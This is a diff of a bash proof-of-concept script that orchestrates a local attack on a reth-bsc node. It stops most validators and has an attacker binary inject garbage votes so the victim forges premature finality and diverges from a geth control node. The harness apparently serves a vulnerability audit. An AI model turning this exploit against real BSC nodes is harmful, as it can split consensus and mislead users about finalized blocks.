       echo "--- probe-reth.log:"; tail -n 20 "$OUT/probe-reth.log" 2>/dev/null
       echo "--- docker logs reth-probe:"; docker logs reth-probe 2>&1 | tail -n 40
       echo "--- state:"; docker inspect -f '{{.State.Status}} exit={{.State.ExitCode}} err={{.State.Error}}' reth-probe 2>&1
@@ -829,34 +829,34 @@ reth_probe() { # $1=file genesis -> echo hash; kosong = gagal (lihat probe-reth-
 
 CAL_LOG="$OUT/genesis-calibration.log"; : > "$CAL_LOG"
 
-# SANITY (mode ""): semua Time=ft. Harus MATCH — reth=? berarti probe rusak.
+# SANITY (mode ""): all Time=ft. Must MATCH — reth=? means broken probe.
 SC="$WORKDIR/sanity.json"
 cp "$DEPLOY_DIR/genesis/genesis.json" "$SC"
 POC_SURGERY_MODE="" python3 "$DEPLOY_DIR/genesis_surgery.py" "$SC" >>"$CAL_LOG" 2>&1
 SHG=$(geth_probe "$SC"); SHR=$(reth_probe "$SC"); rm -f "$SC"
 printf '    %-18s geth=%s reth=%s\n' "SANITY:none" "${SHG:-?}" "${SHR:-?}" | tee -a "$CAL_LOG"
 if [ -z "$SHR" ]; then
-  echo "FATAL: probe reth tidak menjawab utk sanity — PROBE rusak, bukan divergensi."
-  echo "  Kirim: $OUT/probe-reth-crash.log"; exit 1
+  echo "FATAL: reth probe did not answer for sanity — PROBE broken, not divergence."
+  echo "  Send: $OUT/probe-reth-crash.log"; exit 1
 fi
 if [ "$SHG" != "$SHR" ]; then
-  echo "FATAL: sanity diverge (geth=$SHG reth=$SHR) — kirim $CAL_LOG"; exit 1
+  echo "FATAL: sanity diverge (geth=$SHG reth=$SHR) — send $CAL_LOG"; exit 1
 fi
-echo "    sanity OK — probe sehat (baseline: $SHG)"
+echo "    sanity OK — probe healthy (baseline: $SHG)"
 
-# Kandidat: '-plato' duluan (replika 07:08 — diprediksi MATCH, plato aktif via platoBlock:7)
+# Candidate: '-plato' first (07:08 replica — predicted MATCH, plato active via platoBlock:7)
 WINNER=""
 for CAND in "-plato" "plato" "plato,ramanujan"; do
   CP="$WORKDIR/cand.json"
   cp "$DEPLOY_DIR/genesis/genesis.json" "$CP"
   POC_SURGERY_MODE="$CAND" python3 "$DEPLOY_DIR/genesis_surgery.py" "$CP" >>"$CAL_LOG" 2>&1 \
-    || { rm -f "$CP"; printf '    %-18s surgery GAGAL\n' "$CAND" | tee -a "$CAL_LOG"; continue; }
+    || { rm -f "$CP"; printf '    %-18s surgery FAILED\n' "$CAND" | tee -a "$CAL_LOG"; continue; }
   HG=$(geth_probe "$CP"); HR=$(reth_probe "$CP"); rm -f "$CP"
   VERD="diverge"; { [ -n "$HG" ] && [ "$HG" = "$HR" ]; } && VERD="MATCH"
   printf '    %-18s geth=%s reth=%s  %s\n' "$CAND" "${HG:-?}" "${HR:-?}" "$VERD" | tee -a "$CAL_LOG"
   [ "$VERD" = "MATCH" ] && { WINNER="$CAND"; break; }
 done
-[ -n "$WINNER" ] || { echo "FATAL: tidak ada kandidat match — kirim $CAL_LOG + probe-reth-crash.log"; exit 1; }
+[ -n "$WINNER" ] || { echo "FATAL: no matching candidate — send $CAL_LOG + probe-reth-crash.log"; exit 1; }
 echo "    WINNER: $WINNER"
 
 # ---------------------------------------------------------------- [2c/9] CLUSTER ENSURE
@@ -882,10 +882,10 @@ if [ "$NEED" = "1" ]; then
     "$DEPLOY_DIR/genesis/genesis.json" >/dev/null 2>&1 || true
   export POC_SURGERY_MODE="$WINNER"
   ( cd "$DEPLOY_DIR" && bash ./bsc_cluster.sh reset ) >"$OUT/deploy-reset.log" 2>&1 \
-    || { echo "FATAL: reset gagal — tail:"; tail -30 "$OUT/deploy-reset.log"; exit 1; }
+    || { echo "FATAL: reset failed — tail:"; tail -30 "$OUT/deploy-reset.log"; exit 1; }
   UGOK=0
   for i in $(seq 1 120); do m_rpc_up && { UGOK=1; break; }; sleep 2; done
-  [ "$UGOK" = "1" ] || { echo "FATAL: cluster tidak bangkit — kirim $OUT/deploy-reset.log"; exit 1; }
+  [ "$UGOK" = "1" ] || { echo "FATAL: cluster did not wake up — send $OUT/deploy-reset.log"; exit 1; }
   UGH=-1
   for i in $(seq 1 60); do
     UGH=$(jnum "http://127.0.0.1:8545" latest)
@@ -893,7 +893,7 @@ if [ "$NEED" = "1" ]; then
     sleep 2
   done
   if ! [ "$UGH" -ge 8 ] 2>/dev/null; then
-    echo "FATAL: validator tidak menambang (head=$UGH setelah 120s) — kirim $OUT/deploy-reset.log"; exit 1
+    echo "FATAL: validator not mining (head=$UGH after 120s) — send $OUT/deploy-reset.log"; exit 1
   fi
   UG_DIRTY=-1; UG_DWHAT=""; UG_LIST="$(seq 1 12)"
   [ "$UGH" -gt 12 ] && UG_LIST="$UG_LIST $UGH"
@@ -904,50 +904,50 @@ if [ "$NEED" = "1" ]; then
     if [ -n "$bw" ] && [ "$bw" != "clean" ]; then UG_DIRTY=$bn; UG_DWHAT="$bw"; break; fi
   done
   if [ "$UG_DIRTY" -ge 0 ] 2>/dev/null; then
-    echo "FATAL: field post-merge ($UG_DWHAT) muncul mulai blok $UG_DIRTY — transisi mid-chain masih aktif."
-    echo "  Sumber: block-fork (cek surgery block8group) atau --override time (cek nilai flag)."
-    echo "  Kirim: ps -eo args | grep -F config.toml | grep -v grep  +  jq -c '.config' $DEPLOY_DIR/genesis/genesis.json"
+    echo "FATAL: post-merge field ($UG_DWHAT) appears starting block $UG_DIRTY — mid-chain transition still active."
+    echo "  Source: block-fork (check surgery block8group) or --override time (check flag value)."
+    echo "  Send: ps -eo args | grep -F config.toml | grep -v grep  +  jq -c '.config' $DEPLOY_DIR/genesis/genesis.json"
     exit 1
   fi
-  echo "    validator: mining OK (head=$UGH), blok 1..12 PRE-FT (clean) — tanpa transisi mid-chain"
+  echo "    validator: mining OK (head=$UGH), blocks 1..12 PRE-FT (clean) — without mid-chain transition"
   MH=$(m_blk0)
   PT=$(jq -r '.config.platoTime // "null"' "$DEPLOY_DIR/genesis/genesis.json")
   HG2=$(geth_probe "$DEPLOY_DIR/genesis/genesis.json")
   if [ "$PT" != "$EXPECT_PT" ] || [ "$HG2" != "$MH" ]; then
-    echo "FATAL: surgery tak konsisten dgn chain (platoTime=$PT expect=$EXPECT_PT tpl=$HG2 chain=$MH)."
-    echo "  Kirim: grep -n 'patch_genesis_for_reth\|prepare_config\|init' $DEPLOY_DIR/bsc_cluster.sh | head -30"
+    echo "FATAL: surgery inconsistent with chain (platoTime=$PT expect=$EXPECT_PT tpl=$HG2 chain=$MH)."
+    echo "  Send: grep -n 'patch_genesis_for_reth\|prepare_config\|init' $DEPLOY_DIR/bsc_cluster.sh | head -30"
     exit 1
   fi
   printf '%s %s\n' "$WINNER" "$MH" > "$MARK"
   echo "    cluster OK: genesis=$MH head=$UGH platoTime=$PT (winner=$WINNER)"
 else
-  echo "    cluster sesuai (marker: $(cat "$MARK")) — skip reset"
+  echo "    cluster matches (marker: $(cat "$MARK")) — skip reset"
 fi
-# v9: flag --override.<forktime> SELALU ada (start_node menyetelnya);
-# yang dicek NILAINYA — tidak boleh <= sekarang.
+# v9: flag --override.<forktime> ALWAYS present (start_node sets it);
+# what's checked is its VALUE — must not be <= now.
 UG_NOW=$(date +%s)
 UG_PAST=$(ps -eo args 2>/dev/null | grep -F 'config.toml' | grep -v grep \
   | grep -oE -- '--override\.(passedforktime|lorentz|maxwell|fermi|osaka|mendel|pasteur) [0-9]+' \
   | awk -v now="$UG_NOW" '$2 <= now {print}' | head -n 3)
 if [ -n "$UG_PAST" ]; then
-  echo "FATAL: --override fork-time masa lalu masih aktif:"; echo "$UG_PAST"
-  echo "  (sed hardforkTime +7200 tidak diterapkan?) — kirim: ps -eo args | grep -F config.toml | grep -v grep"
+  echo "FATAL: past --override fork-time still active:"; echo "$UG_PAST"
+  echo "  (sed hardforkTime +7200 not applied?) — send: ps -eo args | grep -F config.toml | grep -v grep"
   exit 1
 fi
-echo "    flag check OK — semua --override fork-time future"
+echo "    flag check OK — all --override fork-time future"
 
 GENESIS_JSON="$DEPLOY_DIR/genesis/genesis.json"
 echo "    PIN victim genesis: $GENESIS_JSON"
 
-# ---------------------------------------------------------------- [3/9] discovery adaptif
-echo "[3/9] Discovery: genesis + enode validator + quorum..."
+# ---------------------------------------------------------------- [3/9] adaptive discovery
+echo "[3/9] Discovery: genesis + validator enode + quorum..."
 collect_enodes() {
-  # (1) StaticNodes config.toml — nodekey fix di keys/ => enode stabil lintas reset
+  # (1) StaticNodes config.toml — nodekey fix in keys/ => stable enode across resets
   local found
   found=$(grep -rhoE "enode://[0-9a-f]{128}@[0-9.]+:[0-9]+" \
     "$DEPLOY_DIR"/.local/node*/config.toml 2>/dev/null | sort -u)
   [ -n "$found" ] && { echo "$found"; return 0; }
-  # (2) fallback: RPC admin_nodeInfo (validator hidup)
+  # (2) fallback: RPC admin_nodeInfo (live validators)
   local p e
   for p in 8545 8547 8549; do
     e=$(curl -s -m 2 -X POST -H 'Content-Type: application/json' \
@@ -973,12 +973,12 @@ print(fs[0] if fs else '')" 2>/dev/null || true)
   sleep 5
 done
 [ -n "$GENESIS_JSON" ] && [ -f "$GENESIS_JSON" ] \
-  || { echo "FATAL: genesis.json tidak ditemukan. Set GENESIS_JSON=/path manual."; exit 1; }
+  || { echo "FATAL: genesis.json not found. Set GENESIS_JSON=/path manually."; exit 1; }
 if [ "${#ENODES[@]}" -eq 0 ]; then
   if [ -n "${VALIDATOR_ENODE:-}" ]; then
     ENODES=("$VALIDATOR_ENODE")
   else
-    echo "FATAL: enode validator tidak ditemukan. Set VALIDATOR_ENODE=enode://...@127.0.0.1:<port> manual."; exit 1
+    echo "FATAL: validator enode not found. Set VALIDATOR_ENODE=enode://...@127.0.0.1:<port> manually."; exit 1
   fi
 fi
 N=${#ENODES[@]}
@@ -995,7 +995,7 @@ if [ -z "$VICTIM_RPC_PORT" ]; then
     if ! port_busy "$p"; then VICTIM_RPC_PORT=$p; break; fi
   done
 fi
-[ -n "$VICTIM_RPC_PORT" ] || { echo "FATAL: tidak ada port RPC bebas"; exit 1; }
+[ -n "$VICTIM_RPC_PORT" ] || { echo "FATAL: no free RPC port"; exit 1; }
 VICTIM_RPC="http://127.0.0.1:$VICTIM_RPC_PORT"
 echo "    victim RPC: $VICTIM_RPC (victim p2p 30403, attacker p2p $ATTACK_PORT)"
 
@@ -1017,8 +1017,8 @@ if [ -n "$RETH_BIN" ]; then
     "${TRUSTED[@]}" >"$OUT/victim.log" 2>&1 &
   VICTIM_PID=$!
 else
-  echo "    mode docker (build Dockerfile resmi reth-bsc; 20-60 menit pertama kali)..."
-  # Jaga context build tetap kecil (poc-attack berisi chaindata + clone bsc ratusan MB)
+  echo "    mode docker (build official reth-bsc Dockerfile; 20-60 minutes first time)..."
+  # Keep build context small (poc-attack contains chaindata + bsc clone hundreds of MB)
   if ! grep -q "^poc-attack" "$RETH_SRC/.dockerignore" 2>/dev/null; then
     printf '\n# --- poc.sh: keep build context small ---\npoc-attack\ntarget\n.git\ndist\ndiag\n' >> "$RETH_SRC/.dockerignore"
   fi
@@ -1026,7 +1026,7 @@ else
     --build-arg BUILD_PROFILE=release \
     --build-arg FEATURES="${RETH_FEATURES:-jemalloc,asm-keccak}" \
     "$RETH_SRC" >"$OUT/victim-build.log" 2>&1 \
-    || { echo "FATAL: build docker victim gagal — lihat $OUT/victim-build.log"; exit 1; }
+    || { echo "FATAL: victim docker build failed — see $OUT/victim-build.log"; exit 1; }
   docker rm -f "$VICTIM_CTR" >/dev/null 2>&1
   docker run -d --name "$VICTIM_CTR" --network host \
     -v "$GENESIS_JSON":/genesis.json:ro \
@@ -1037,7 +1037,7 @@ else
       --http --http.addr 0.0.0.0 --http.port "$VICTIM_RPC_PORT" \
       --http.api eth,net,web3,admin \
       "${TRUSTED[@]}" >/dev/null \
-    || { echo "FATAL: run victim gagal — docker logs $VICTIM_CTR"; exit 1; }
+    || { echo "FATAL: run victim failed — docker logs $VICTIM_CTR"; exit 1; }
 fi
 
 # ---------------------------------------------------------------- [5/9] sync checkpoint
@@ -1049,24 +1049,24 @@ for i in $(seq 1 30); do
 done
 GH2=$(rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x0",false],"id":1}' "http://127.0.0.1:8545" | jq -r '.result.hash // empty')
 if [ -n "$GH1" ] && [ -n "$GH2" ] && [ "$GH1" != "$GH2" ]; then
-  echo "FATAL: genesis mismatch victim=$GH1 miner=$GH2 — genesis berubah tanpa reset."
-  echo "  Jalankan ulang ./poc.sh (fase [2b] re-konvergensi otomatis).
-  Berulang? kirim audit-out/genesis-calibration.log + deploy-reset.log + jq -c '.config' poc-attack/node-deploy/genesis/genesis.json"
+  echo "FATAL: genesis mismatch victim=$GH1 miner=$GH2 — genesis changed without reset."
+  echo "  Run ./poc.sh again (phase [2b] auto re-converges).
+  Repeated? send audit-out/genesis-calibration.log + deploy-reset.log + jq -c '.config' poc-attack/node-deploy/genesis/genesis.json"
   exit 1
 fi
 echo "    genesis hash match: $GH1"
-echo "[5/9] CHECKPOINT: tunggu victim sinkron dari validator cluster..."
+echo "[5/9] CHECKPOINT: wait for victim to sync from validator cluster..."
 V=0
 for i in $(seq 1 240); do
   V=$(jnum "$VICTIM_RPC" latest)
   [ "$V" -ge 3 ] 2>/dev/null && break
   if [ -n "$VICTIM_PID" ] && ! kill -0 "$VICTIM_PID" 2>/dev/null; then
-    echo "FATAL: proses victim mati — tail $OUT/victim.log:"; tail -20 "$OUT/victim.log"; exit 1
+    echo "FATAL: victim process died — tail $OUT/victim.log:"; tail -20 "$OUT/victim.log"; exit 1
   fi
   sleep 2
 done
 [ "$V" -ge 3 ] 2>/dev/null || {
-  echo "FATAL: victim tidak sinkron (blok=$V)."
+  echo "FATAL: victim not synced (block=$V)."
   echo "--- victim log:"
   if [ -n "$VICTIM_PID" ] && [ -f "$OUT/victim.log" ]; then tail -40 "$OUT/victim.log"
   else docker logs "$VICTIM_CTR" 2>&1 | tail -40; fi
@@ -1076,7 +1076,7 @@ done
   rpc_raw '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' "http://127.0.0.1:8545"; echo
   rpc_raw '{"jsonrpc":"2.0","method":"net_peerCount","params":[],"id":1}' "http://127.0.0.1:8545"; echo
   rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["latest",false],"id":1}' "http://127.0.0.1:8545" \
-    | jq -r '.result | if (.withdrawals | type) == "array" then "post-merge AKTIF (fork-ID divergen!)" else "clean" end' 2>/dev/null
+    | jq -r '.result | if (.withdrawals | type) == "array" then "post-merge ACTIVE (fork-ID divergent!)" else "clean" end' 2>/dev/null
   echo "--- victim log (disconnect/status/forkid):"
   if [ -n "$VICTIM_PID" ] && [ -f "$OUT/victim.log" ]; then
     grep -iE 'disconnect|fork.?id|useless|banned|removing|status' "$OUT/victim.log" | tail -30
@@ -1088,10 +1088,10 @@ done
   rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x0",false],"id":1}' "http://127.0.0.1:8545" | jq -r '.result.hash // "null"'
   exit 1
 }
-echo "    victim di blok $V"
+echo "    victim at block $V"
 
-# ---------------------------------------------------------------- [6/9] CHECKPOINT-1: finality organik
-echo "[6/9] CHECKPOINT-1: verifikasi finality organik bergerak (normal flow)..."
+# ---------------------------------------------------------------- [6/9] CHECKPOINT-1: organic finality
+echo "[6/9] CHECKPOINT-1: verify organic finality moves (normal flow)..."
 F_PRE=$(jnum "$VICTIM_RPC" finalized)
 F_POST=$F_PRE
 for i in $(seq 1 300); do
@@ -1103,7 +1103,7 @@ echo "{\"phase\":\"checkpoint1\",\"finalized_before\":$F_PRE,\"finalized_after\"
 if [ "$F_POST" -gt "$F_PRE" ] 2>/dev/null; then
   echo "    CHECKPOINT-1 OK (finalized $F_PRE -> $F_POST)"
 else
-  echo "    !! CHECKPOINT-1 GAGAL dalam 300s — window mungkin tertutup (keterbatasan setup). Run tetap dilanjutkan untuk transkrip jujur."
+  echo "    !! CHECKPOINT-1 FAILED within 300s — window might be closed (setup limitation). Run continues for honest transcript."
 fi
 
 # ---------------------------------------------------------------- [7/9] BEFORE
@@ -1116,7 +1116,7 @@ try:
     print((len(e)-2)//2)
 except Exception:
     print(-1)" 2>/dev/null || echo -1)
-echo "    attestation: extraData blok latest validator = ${ATST}B (>~250 = attestation ada; <160 = validator tanpa vote-keys)"
+echo "    attestation: validator latest block extraData = ${ATST}B (>~250 = attestation present; <160 = validator without vote-keys)"
 
 echo "[7/9] BEFORE snapshot:"
 for i in 1 2 3; do
@@ -1125,25 +1125,25 @@ for i in 1 2 3; do
 done
 
 # ---------------------------------------------------------------- [8/9] OUTAGE ORCHESTRATION
-# Skenario realistis (pernah terjadi di BSC): 2/3 validator down -> quorum
-# organik hilang -> seluruh jaringan geth membekukan finality. Victim reth
-# tetap memajukan finalized dari vote garbage attacker -> DIVERGENSI vs node
-# kontrol geth. Ini satu-satunya jendela forge: blok solo PERTAMA pasca-outage
-# (attestation pra-kematian menaikkan justified ke head-1; vote organik utk
-# head baru = 1 < quorum; garbage melengkapi hitungan).
-echo "[8/9] Outage orchestration: fullnode kontrol (geth) + attacker + stop 2/3 validator..."
+# Realistic scenario (has happened on BSC): 2/3 validators down -> quorum
+# lost organically -> entire geth network freezes finality. Victim reth
+# still advances finalized from attacker's garbage votes -> DIVERGENCE vs
+# geth control node. This is the only forge window: the FIRST solo block post-outage
+# (pre-death attestation raises justified to head-1; organic votes for
+# new head = 1 < quorum; garbage completes the count).
+echo "[8/9] Outage orchestration: control fullnode (geth) + attacker + stop 2/3 validators..."
 TL="$OUT/outage-timeline.log"; : > "$TL"
 
-echo "    [8a] start node kontrol geth (bsc_fullnode.sh reset 0 full)..."
+echo "    [8a] start geth control node (bsc_fullnode.sh reset 0 full)..."
 ( cd "$DEPLOY_DIR" && bash ./bsc_fullnode.sh reset 0 full ) >"$OUT/fullnode.log" 2>&1 \
-  || { echo "FATAL: bsc_fullnode.sh reset gagal — tail $OUT/fullnode.log:"; tail -10 "$OUT/fullnode.log"; exit 1; }
-# reset bisa hanya init — pastikan proses hidup (restart = stop+start)
+  || { echo "FATAL: bsc_fullnode.sh reset failed — tail $OUT/fullnode.log:"; tail -10 "$OUT/fullnode.log"; exit 1; }
+# reset might only init — ensure process is alive (restart = stop+start)
 sleep 3
 if ! pgrep -f 'fullnode/node0' >/dev/null 2>&1; then
-  echo "    reset tidak meninggalkan proses — jalankan 'restart 0 full'..."
+  echo "    reset left no process — running 'restart 0 full'..."
   ( cd "$DEPLOY_DIR" && bash ./bsc_fullnode.sh restart 0 full ) >>"$OUT/fullnode.log" 2>&1 || true
 fi
-# port RPC dari cmdline proses (flag --http.port); fallback config lokal
+# RPC port from process cmdline (flag --http.port); fallback local config
 CRPC=""
 for i in $(seq 1 90); do
   FP=$(pgrep -f 'fullnode/node0' | head -n1)
@@ -1161,26 +1161,26 @@ for i in $(seq 1 90); do
   sleep 2
 done
 [ -n "$CRPC" ] || {
-  echo "FATAL: RPC fullnode kontrol tidak ditemukan."
-  echo "--- proses fullnode:"; pgrep -af fullnode || echo "(tidak ada)"
-  echo "--- isi .local/fullnode/node0:"; ls "$DEPLOY_DIR/.local/fullnode/node0/" 2>/dev/null
-  echo "--- log runtime (bsc-node.log tail):"
-  tail -30 "$DEPLOY_DIR/.local/fullnode/node0/bsc-node.log" 2>/dev/null || echo "(tidak ada)"
+  echo "FATAL: control fullnode RPC not found."
+  echo "--- fullnode process:"; pgrep -af fullnode || echo "(none)"
+  echo "--- contents of .local/fullnode/node0:"; ls "$DEPLOY_DIR/.local/fullnode/node0/" 2>/dev/null
+  echo "--- runtime log (bsc-node.log tail):"
+  tail -30 "$DEPLOY_DIR/.local/fullnode/node0/bsc-node.log" 2>/dev/null || echo "(none)"
   echo "--- fullnode.log tail:"; tail -10 "$OUT/fullnode.log"
   exit 1
 }
-echo "    kontrol RPC: $CRPC"
-echo "    tunggu kontrol sync ke head victim..."
+echo "    control RPC: $CRPC"
+echo "    wait for control to sync to victim head..."
 SYNCED=0; CV=-1; VV=-1
 for i in $(seq 1 180); do
   CV=$(jnum "$CRPC" latest); VV=$(jnum "$VICTIM_RPC" latest)
   if [ "$CV" -ge "$VV" ] 2>/dev/null && [ "$VV" -ge 3 ] 2>/dev/null; then SYNCED=1; break; fi
   sleep 2
 done
-[ "$SYNCED" = "1" ] || { echo "FATAL: kontrol tidak sync (head=$CV vs victim=$VV)"; exit 1; }
-echo "    kontrol synced (head=$CV)"
+[ "$SYNCED" = "1" ] || { echo "FATAL: control not synced (head=$CV vs victim=$VV)"; exit 1; }
+echo "    control synced (head=$CV)"
 
-# [8b] baseline parity finality (kedua node sehat, sama-sama organik)
+# [8b] baseline finality parity (both nodes healthy, both organic)
 BF_V=$(jnum "$VICTIM_RPC" finalized); BF_C=$(jnum "$CRPC" finalized)
 for i in $(seq 1 60); do
   [ "$BF_V" = "$BF_C" ] && [ "$BF_V" -gt 0 ] 2>/dev/null && break
@@ -1188,8 +1188,8 @@ for i in $(seq 1 60); do
 done
 echo "    [8b] baseline: victim_finalized=$BF_V control_finalized=$BF_C head=$VV"
 
-# [8c] attacker di background — inject tiap head baru, terus menerus
-echo "    [8c] attacker background (inject per head; sync-dump tiap reconnect = bukti ingestion+propagasi)..."
+# [8c] attacker in background — inject per new head, continuously
+echo "    [8c] attacker background (inject per head; sync-dump per reconnect = proof of ingestion+propagation)..."
 ALOG="$OUT/attack-transcript.log"; : > "$ALOG"
 VICTIM_RPC="$VICTIM_RPC" ADVERTISE_IP=127.0.0.1 LISTEN_PORT="$ATTACK_PORT" \
 QUORUM="$QUORUM" OBSERVE_HEADS="${OBSERVE_HEADS:-2}" CONTROL_HEADS="${CONTROL_HEADS:-1}" \
@@ -1198,17 +1198,17 @@ timeout 900 "$ATTACKER_BIN" >"$ALOG" 2>&1 &
 APID=$!
 FASE3=0
 for i in $(seq 1 240); do
-  grep -q 'FASE 3' "$ALOG" && { FASE3=1; break; }
+  grep -q 'PHASE 3' "$ALOG" && { FASE3=1; break; }
   kill -0 "$APID" 2>/dev/null || break
   sleep 1
 done
 if [ "$FASE3" != "1" ]; then
-  echo "FATAL: attacker tidak mencapai FASE 3 — tail $ALOG:"; tail -20 "$ALOG"
+  echo "FATAL: attacker did not reach PHASE 3 — tail $ALOG:"; tail -20 "$ALOG"
   kill "$APID" 2>/dev/null; exit 1
 fi
-echo "    FASE 3 aktif — attacker menyuntik tiap head baru"
+echo "    PHASE 3 active — attacker injecting per new head"
 
-# [8d] OUTAGE: stop 2/3 validator; monitor divergensi per detik
+# [8d] OUTAGE: stop 2/3 validators; monitor divergence per second
 echo "    [8d] OUTAGE: stop validator idx1 & idx2 (node0 solo)..."
 echo "=== OUTAGE START $(date) ===" >> "$TL"
 ( cd "$DEPLOY_DIR" && bash ./bsc_cluster.sh stop 1 >/dev/null 2>&1 || true; \
@@ -1225,7 +1225,7 @@ for i in $(seq 1 180); do
       DIV=1; DIV_AT="$(date +%H:%M:%S)"
       VFH=$(rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["finalized",false],"id":1}' "$VICTIM_RPC" | jq -r '.result.hash // "?"')
       CFH=$(rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["finalized",false],"id":1}' "$CRPC" | jq -r '.result.hash // "?"')
-      echo "    >>> DIVERGENSI pertama: victim=$VF ($VFH) vs kontrol=$CF ($CFH) <<<" | tee -a "$TL"
+      echo "    >>> FIRST DIVERGENCE: victim=$VF ($VFH) vs control=$CF ($CFH) <<<" | tee -a "$TL"
     fi
     [ "$D" -gt "$MAXD" ] && MAXD=$D
     AFTER=$((AFTER + 1))
@@ -1235,8 +1235,8 @@ for i in $(seq 1 180); do
 done
 echo "=== OUTAGE END (monitor) $(date) ===" >> "$TL"
 
-# [8e] pemulihan + sampel pasca-outage
-echo "    [8e] pemulihan: start seluruh validator..."
+# [8e] recovery + post-outage sample
+echo "    [8e] recovery: start all validators..."
 ( cd "$DEPLOY_DIR" && bash ./bsc_cluster.sh start >/dev/null 2>&1 || true )
 for i in $(seq 1 90); do
   m_rpc_up && { VH2=$(jnum "$VICTIM_RPC" latest); [ "$VH2" -gt "$VH" ] 2>/dev/null && break; }
@@ -1250,7 +1250,7 @@ HITS=$(grep -o 'attacker_hits=[0-9]*' "$ALOG" | tail -1 | grep -oE '[0-9]+' || e
 ARC=3
 if [ "$DIV" = "1" ]; then
   ARC=0
-  echo ">>> PREMATURE FINALITY VIA GARBAGE VOTES: victim divergen dari jaringan (max_delta=$MAXD, pertama=$DIV_AT) <<<"
+  echo ">>> PREMATURE FINALITY VIA GARBAGE VOTES: victim divergent from network (max_delta=$MAXD, first=$DIV_AT) <<<"
 fi
 echo "{\"baseline\":{\"victim\":$BF_V,\"control\":$BF_C},\"outage\":{\"max_delta\":$MAXD,\"divergence_first\":\"$DIV_AT\"},\"post_recovery\":{\"victim\":$PF_V,\"control\":$PF_C},\"attacker_hits_last\":${HITS:-0}}" \
   | tee "$OUT/outage-result.json"
@@ -1266,19 +1266,20 @@ fi
 
 echo "===================================================================="
 if [ "$ARC" = "0" ]; then
-  echo "HASIL: PREMATURE FINALITY TERFORGE + DIVERGENSI vs JARINGAN (exit=0)."
-  echo "Bukti  : $OUT/outage-timeline.log  — delta>0 selama outage (victim vs geth kontrol)"
-  echo "         $OUT/attack-transcript.log — injeksi per head + sync-dump attacker_hits=${HITS:-0}"
+  echo "RESULT: PREMATURE FINALITY FORGED + DIVERGENCE vs NETWORK (exit=0)."
+  echo "Proof  : $OUT/outage-timeline.log  — delta>0 during outage (victim vs geth control)"
+  echo "         $OUT/attack-transcript.log — injection per head + sync-dump attacker_hits=${HITS:-0}"
   echo "         $OUT/outage-result.json"
 else
-  echo "HASIL: divergensi tidak teramati (exit=3). Diagnosa urut:"
-  echo "  1) tail $TL: head_v MENTOK sementara head_c maju -> victim menolak blok wiggle solo;"
-  echo "     konfirmasi: grep -c 'backoff period' $OUT/victim-final.log"
-  echo "  2) fin_v == fin_c sejak awal -> jendela gate (justified==head-1) tak terbuka;"
-  echo "     cek attestation blok solo: eth_getBlockByNumber head_c via $CRPC (panjang extraData)"
-  echo "  3) attacker_hits=0 -> sesi bsc/2 tak aktif (grep ESTABLISHED $ALOG)"
+  echo "RESULT: divergence not observed (exit=3). Sequential diagnosis:"
+  echo "  1) tail $TL: head_v STUCK while head_c advances -> victim rejects solo wiggle block;"
+  echo "     confirmation: grep -c 'backoff period' $OUT/victim-final.log"
+  echo "  2) fin_v == fin_c from the start -> gate window (justified==head-1) not open;"
+  echo "     check solo block attestation: eth_getBlockByNumber head_c via $CRPC (extraData length)"
+  echo "  3) attacker_hits=0 -> bsc/2 session inactive (grep ESTABLISHED $ALOG)"
 fi
-echo "Artefak : $OUT/"
+echo "Artifacts : $OUT/"
 echo "Teardown: ./poc.sh clean"
 echo "===================================================================="
 exit "$ARC"
+}
